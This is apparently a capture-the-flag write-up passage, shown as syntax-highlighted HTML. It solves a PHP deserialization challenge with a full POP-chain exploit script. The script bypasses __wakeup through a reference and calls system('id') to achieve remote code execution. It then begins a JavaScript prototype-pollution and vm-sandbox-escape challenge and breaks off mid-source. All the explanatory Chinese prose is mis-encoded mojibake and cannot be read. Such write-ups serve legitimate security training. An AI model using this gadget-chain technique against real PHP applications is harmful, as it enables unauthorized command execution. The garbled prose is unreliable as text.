boolean">False</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>È¶ñÂÖàÊâæÂà∞ÂÖ•Âè£<code>__destruct()</code>ÔºåÂú®<code>DataObject Á±ªÈáå</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáå‰ºöÈÅçÂéÜdataÁöÑÂÜÖÂÆπÔºåÂ∞ÜkeyÂíåvalueËµãÂÄºÁªôstorageÔºåËß¶Âèë Storage ÁöÑ <code>__set</code> ÊñπÊ≥ï</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáåÂ¶ÇÊûú<code>$store</code>‰∏∫Á©∫ÔºåÈÇ£‰πàÂ∞±ÂàùÂßãÂåñ‰∏Ä‰∏™Á©∫ÁöÑarray()Ôºå‰∏ã‰∏Ä‰∏™ifËØ≠Âè•Â∞±ÊòØË∞ÉÁî®valueÁöÑexpireÊñπÊ≥ïÔºåÂ¶ÇÊûúËøîÂõûfalseÂ∞±Â∞ÜvalueÊîæÂÖ•store‰∏≠„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®CacheÁ±ª‰∏≠expiredÊñπÊ≥ï‰ºöÂà§Êñ≠ÂÜÖÈÉ®ÁöÑexpiredÂ±ûÊÄßÊòØÂê¶‰∏∫trueÔºåÂ¶ÇÊûúÊòØÔºåÂàô‰ºöË∞ÉÁî®helperÁöÑcleanÊñπÊ≥ïÔºåËÄåcleanÂèëÊñπÊ≥ï‰∏çÂ≠òÂú®ÔºåÂÆûÈôÖ‰∏äÂ∞±ÊòØË∞ÉÁî®<code>__call</code>ÊñπÊ≥ï</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáå<code>__call</code>‰ºöÊåâÁÖß‰º†ÂÖ•ÁöÑname‰ªéfuncÊï∞ÁªÑ‰∏≠ÂéªÈô§ÂØπÂ∫îÁöÑÂáΩÊï∞ÂêçÔºåÁÑ∂ÂêéÂ∞Üargs‰Ωú‰∏∫ÂèÇÊï∞Êù•Ë∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞ÔºåËøôÈáåÂ∞±ÊòØÂ≠òÂú®getshellÁöÑÂú∞Êñπ„ÄÇ<br>Â¶ÇÊûúË¶ÅÂà∞ËææÊúÄÂêéÁöÑ<code>__call</code>ÊñπÊ≥ïÔºåÈúÄË¶ÅËÆ©CacheÁ±ª‰∏≠ÁöÑexpiredÂ±ûÊÄß‰∏∫trueÔºå‰ΩÜÊòØCache‰∏≠‰ºöÂÖàËß¶ÂèëwakeupÊñπÊ≥ïÔºåËøôÂ∞±‰ΩøÂæóexpired‰∏∫falseÔºåÈúÄË¶ÅÂÖàÁªïËøáwakeupÊñπÊ≥ï<br>ÂéüÊù•Êúâ‰∏™Êñ∞ÁîüËµõÂ∞±ÊúâËøô‰∏™Áü•ËØÜÁÇπÔºå‰ΩøÁî®phpÂºïÁî®ÁöÑÊ¶ÇÂøµ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Ëøô‰∏™Êó∂ÂÄôbÁöÑÂÄºÂ∞±Á≠â‰∫éaÁöÑÂÄºÔºåbÁöÑÂÄº‰∏ÄÊó¶ÊîπÂèòÔºåaÁöÑÂÄº‰πü‰ºöË∑üÁùÄÊîπÂèò„ÄÇaÂíåbÊåáÂêëÁõ∏ÂêåÁöÑÂÜÖÂ≠òÂú∞ÂùÄ</p><p>Êàë‰ª¨ÂèØ‰ª•ËÆ©expiredÂ±ûÊÄßÊàê‰∏∫Êüê‰∏™ÂèòÈáèÁöÑÂºïÁî®ÔºåËøôÊ†∑Âç≥‰ΩøÁé∞Âú®expiredÂ±ûÊÄßÂÄº‰∏∫falseÔºå‰ΩÜÊòØÂêéÈù¢ÁöÑËøáÁ®ã‰∏≠‰∏ÄÊó¶ÊîπÂèòÂºïÁî®ÂèòÈáèÁöÑÂÄºÔºåexpired Â±ûÊÄßÂÄº‰πü‰ºöË¢´ÊîπÂèòÔºåÂè™Ë¶ÅÂÄº‰∏çÊòØnullÔºåÂ∞±‰ºöÁªïËøáifÂà§Êñ≠„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'clean'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cache1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cache1</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token variable">$cache2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span><span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span><span class="token variable">$storage</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$storage</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">;</span><span class="token variable">$dataObject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key1'</span> <span class="token operator">=></span> <span class="token variable">$cache1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'key2'</span> <span class="token operator">=></span> <span class="token variable">$cache2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">storage</span> <span class="token operator">=</span> <span class="token variable">$storage</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$dataObject</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>È¶ñÂÖàÂæÄDataObjectÁöÑdataÈáå‰º†ÂÖ•‰∏§‰∏™ÂÆû‰æãÔºåÂÖ∂‰∏≠‰º†ÂÖ•ÁöÑcache2ÊåáÂÆö‰∫ÜhelperÔºåkeyÂÄºËÆæÁΩÆ‰∏∫Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§ÔºåhelperÁöÑclean()ÔºàÂÆûÈôÖ‰∏äÊòØ<code>__call</code>ÁöÑfuncsÊï∞ÁªÑÔºâÊîæÂÖ•‰∫ÜsystemÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÔºåÁÑ∂ÂêéËÆ©StorgeÁöÑstoreÂ±ûÊÄßÊàê‰∏∫cache2 expired Â±ûÊÄßÁöÑÂºïÁî®</p><p>ËøôÊ†∑, Âú®ÂèçÂ∫èÂàóÂåñÊó∂, È¶ñÂÖà‰ºöË∞ÉÁî®‰∏§‰∏™ Cache ÁöÑ __wakeup ÊñπÊ≥ï, Â∞ÜÂêÑËá™ÁöÑ expired ËÆæÁΩÆ‰∏∫ False<br>ÁÑ∂ÂêéË∞ÉÁî® dataObject ÁöÑ __destruct ÊñπÊ≥ï, ‰ªéËÄåË∞ÉÁî® Storage ÁöÑ __set ÊñπÊ≥ï<br>Storage È¶ñÂÖàÂ∞Ü store (Âç≥ cache1 ÁöÑ expired Â±ûÊÄß) ÂàùÂßãÂåñ‰∏∫‰∏Ä‰∏™Á©∫Êï∞ÁªÑ, ÁÑ∂ÂêéÂ≠òÂÖ• cache1<br>Ê≠§Êó∂, store ‰∏ç‰∏∫Á©∫, ÈÇ£‰πà‰πüÂ∞±ÊòØËØ¥ cache1 ÁöÑ expired Â±ûÊÄß‰∏ç‰∏∫Á©∫<br>ÁÑ∂ÂêéÊù•Âà∞ cache2, storage ÁöÑ __set ÊñπÊ≥ïË∞ÉÁî®ÂÆÉÁöÑ expired ÊñπÊ≥ï, ËøõÂÖ• if Âà§Êñ≠<br>Âõ†‰∏∫Ê≠§Êó∂ cache2 ÁöÑ expired Â≠óÊÆµ, ‰πüÂ∞±ÊòØ‰∏äÈù¢ÁöÑ store, Â∑≤ÁªèË¢´ËÆæÁΩÆÊàê‰∫Ü‰∏Ä‰∏™Êï∞ÁªÑ, Âπ∂‰∏îÊï∞ÁªÑ‰∏≠Â≠òÂú® cache1 (‰∏ç‰∏∫Á©∫), Âõ†Ê≠§ËøôÈáå if Ë°®ËææÂºèÁöÑÁªìÊûú‰∏∫ True<br>ÊúÄÂêéËøõÂÖ• helper ÁöÑ clean ÊñπÊ≥ï, ÊâßË°å system(‚Äòid‚Äô); ÂÆûÁé∞ RCE</p><h2 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h2><p>ËÄÉÁÇπÔºöJavaScript ÂéüÂûãÈìæÊ±°ÊüìÁªïËøá„ÄÅvm Ê≤ôÁÆ±ÈÄÉÈÄ∏</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#app<span class="token punctuation">.</span>js<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> admins <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token 